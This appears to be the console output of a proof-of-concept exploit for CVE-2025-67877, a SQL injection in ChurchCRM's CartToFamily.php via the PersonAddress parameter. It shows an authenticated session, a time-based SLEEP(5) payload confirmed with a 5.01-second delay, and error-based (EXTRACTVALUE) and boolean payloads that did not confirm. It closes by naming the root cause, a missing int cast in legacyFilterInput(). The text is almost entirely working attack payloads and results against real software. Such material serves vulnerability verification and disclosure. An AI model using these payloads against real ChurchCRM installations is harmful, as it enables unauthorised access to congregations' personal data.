======================================================================
CVE-2025-67877 - ChurchCRM SQL Injection PoC
Target: CartToFamily.php - PersonAddress parameter
======================================================================
[*] Attempting login...
[+] Login successful
[*] Setting up cart with test persons...
[+] Added person 2 to cart
[+] Added person 3 to cart
[+] Cart now contains persons: ['3']

[*] Cart ready with persons: ['3']

============================================================
[*] TEST 1: Time-based SQL Injection (SLEEP(5))
============================================================
[*] Payload: PersonAddress=1 AND SLEEP(5)-- -
[*] Expected delay: ~5 seconds
[*] Actual response time: 5.01 seconds
[+] SUCCESS: Response delayed by 5.01s!
[+] TIME-BASED SQL INJECTION CONFIRMED!
[*] Setting up cart with test persons...
[+] Added person 2 to cart
[+] Cart now contains persons: ['3']

============================================================
[*] TEST 2: Error-based SQL Injection (EXTRACTVALUE)
============================================================
[*] Payload: PersonAddress=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT VERSION()),0x7e))-- -
[-] Could not extract data via EXTRACTVALUE
[*] Setting up cart with test persons...
[+] Added person 2 to cart
[+] Cart now contains persons: ['3']

============================================================
[*] TEST 3: Boolean-based SQL Injection
============================================================
[*] Testing TRUE condition: 1 AND 1=1-- -
[*] Testing FALSE condition: 1 AND 1=2-- -
[*] Response length (TRUE):  0
[*] Response length (FALSE): 0
[-] Could not confirm boolean-based injection

======================================================================
FINAL RESULTS:
======================================================================
  Time-based SQLi:    CONFIRMED (delay: 5.01s)
  Error-based SQLi:   NOT CONFIRMED 
  Boolean-based SQLi: NOT CONFIRMED
======================================================================

[+] VULNERABILITY CONFIRMED: CVE-2025-67877
[+] SQL Injection in CartToFamily.php PersonAddress parameter
[+] Root cause: Missing 'int' type cast in InputUtils::legacyFilterInput()

